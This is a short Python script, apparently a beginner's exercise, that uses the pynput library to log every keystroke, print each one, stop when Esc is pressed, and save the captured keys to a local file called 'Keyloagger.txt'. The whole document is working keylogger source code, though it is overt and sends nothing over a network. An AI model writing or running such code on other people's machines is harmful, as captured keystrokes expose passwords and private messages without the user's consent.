import pynput
from pynput.keyboard import Key, Listener

keys = []
def on_press(key):
    print("{} key pressed".format(key))
    keys.append(key)

def on_release(key):
    if key == Key.esc:
        return False

def write_file(key_write):
    file = open("Keyloagger.txt","w+")

    for x in key_write:
        file.write(str(x))
    file.close()

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

write_file(keys)
